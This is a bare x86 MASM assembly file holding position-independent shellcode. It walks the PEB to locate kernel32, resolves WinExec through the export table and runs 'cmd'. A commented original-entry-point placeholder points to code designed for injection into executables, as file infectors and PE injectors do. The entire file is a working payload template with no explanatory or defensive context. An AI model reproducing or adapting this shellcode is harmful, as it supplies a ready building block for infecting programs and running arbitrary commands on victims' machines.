    .386
    .MODEL Flat, STDCALL
    option casemap:none             ; Treat labels as case-sensitive

.CODE
start:
incode segment
_start:    
    call    delta
	delta:
        pop     ebp
        sub     ebp, offset delta                    
 
    ASSUME FS:NOTHING  
    mov ebx, fs:[30h]                               ;PEB
    mov ebx, [ebx + 0Ch]                            ;get PEB->Ldr
    mov ebx, [ebx + 14h]                            ;get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
    mov ebx, [ebx]                                  ;2nd Entry
    mov ebx, [ebx]                                  ;3rd Entry
    mov ebx, [ebx + 10h]                            ;Get Kernel32 Base
    mov [ebp + offset addr_Kernel32], ebx
    add ebx, [ebx+3Ch]                              ;PE header
    mov ebx, [ebx+78h]                              ;RVA of Export Directory
    add ebx, [ebp+ offset addr_Kernel32]            ;VA of Export Directory
    mov [ebp+offset addr_ExportDir] , ebx
 
    lea edx,[ebp+offset api_WinExec]
    mov ecx,[ebp+offset len_WinExec]
    call GetFunctionAddress
    
    mov  ecx, 1h
    push ecx
    lea ecx, [ebp + offset cmd]
    push ecx
    call eax
     
    ;push 0BBBBBBBBh   ;OEP
    retn
 

;---------------------------------------------------------------;
;Params: Function name in edx, Length in ecx                    ;
;Result: Function addr in eax                                   ;
;---------------------------------------------------------------;  
 
GetFunctionAddress:
    ;Save registers
    push ebx
    push esi
    push edi
 
    mov esi, [ebp + offset addr_ExportDir]
    mov esi, [esi + 20h]                        ;RVA of Export Name Table
    add esi, [ebp + offset addr_Kernel32]       ;VA of Export Name Table
    xor ebx, ebx
    cld                                         ;clear DF flag for string operations
 
    _next:
        inc ebx                                 ;next function name
        lodsd                                   ;get RVA of function name from name table [ESI:[0]
        add eax, [ebp+offset addr_Kernel32]     ;eax now points to the string of a function
        push esi                                ;preserve register for string compare operation
        mov esi, eax
        mov edi, edx
        cld
        push ecx                                ;preserve input length
        repe cmpsb                              ;compare function name [ESI] and input [EDI]
        pop ecx                                 ;recover input length
        pop esi
        jne _next                               ;if ecx != 0 after compare -> not equal

        dec ebx                                 ;decrease to get exactly index
        mov eax, [ebp+offset addr_ExportDir]
        mov eax, [eax+24h]                      ;RVA of Export Ordinal Table
        add eax, [ebp+offset addr_Kernel32]     ;VA of Export Ordinal Table
        mov edx, [ebx*2+eax]
        movzx eax, dx                           ;eax now holds the ordinal of our function
        mov ebx, [ebp+offset addr_ExportDir]
        mov ebx, [ebx+1Ch]                      ;RVA of Export Address Table
        add ebx, [ebp+offset addr_Kernel32]     ;VA of Export Address Table
        mov ebx, [eax*4+ebx]
        add ebx, [ebp+offset addr_Kernel32]
        mov eax, ebx
    
    ;recover registers
    pop edi
    pop esi
    pop ebx
    ret
        
    
 
;---------------------------------------------------------------;
;---------------------------FUNCTIONS---------------------------;
;---------------------------------------------------------------;                
cmd         db "cmd",0
api_WinExec        db    "WinExec"
len_WinExec         dd    $-api_WinExec
addr_Kernel32           dd    0
addr_ExportDir          dd    0
                    
_end:
incode ends
end start
